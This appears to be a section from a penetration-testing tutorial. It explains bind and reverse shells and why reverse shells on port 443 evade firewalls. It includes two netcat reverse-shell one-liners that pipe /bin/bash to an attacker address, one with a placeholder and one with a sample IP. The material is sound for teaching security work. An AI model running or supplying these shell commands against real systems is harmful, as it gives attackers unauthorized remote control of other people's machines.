.. _Popping Shells:

Popping Shells
==============

While learning to exploit various services and applications is fun and exciting, in the end our goal is almost always to gain command-line access to our targets. (Hackers sometimes call this "popping shells.") The most commonly-used methods are the TCP Bind and Reverse shells.

**Bind Shells** are the simplest form of shells. To create a bind shell, a command-line interpreter (such as ``cmd.exe`` or ``/bin/bash``) is bound to a local port on the target system, and the remote attacker connects to that port in order to gain access to the system. The target acts as a server, and the attacker acts as a client.

**Reverse Shells** work in the opposite direction. To create a reverse shell, the attacker binds an application to listen to a local port on the attacking machine, then instructs the target system to act as a client, connecting to the attacker's machine on the specified port, and piping all input and output to the command-line interpreter. In this way, the attacker acts as a server, and the target acts as a client.

While Bind shells are simpler to create, they require the attacker to be able to connect on the bound port. If a firewall is blocking inbound connections to strange ports, this can make a Bind shell impossible. This is where Reverse shells shine: they instruct the target to create an outbound connection to the attacker. Firewalls are less likely to block outbound traffic, especially if it's going to popular ports like 443 (HTTPS). By establishing a Reverse shell on port 443, the connection is significantly more likely to succeed.

The following sections discuss the various methods commonly used to establish these types of shells. In each example, the following substitutions are made:

* ``[Target IP]``: The IP of the target.
* ``[Attacker IP]``: The IP of the attacker.
* ``[Port]``: The communication port.

Consider the following reverse shell example:

.. code-block:: none

    nc -e /bin/bash [Attacker IP] [Port]

In practice, you'll substitute the appropriate values, like so:

.. code-block:: none

    nc -e /bin/bash 10.10.14.15 443


.. toctree::
   :caption: Section Contents
   :maxdepth: 1

   netcat.rst
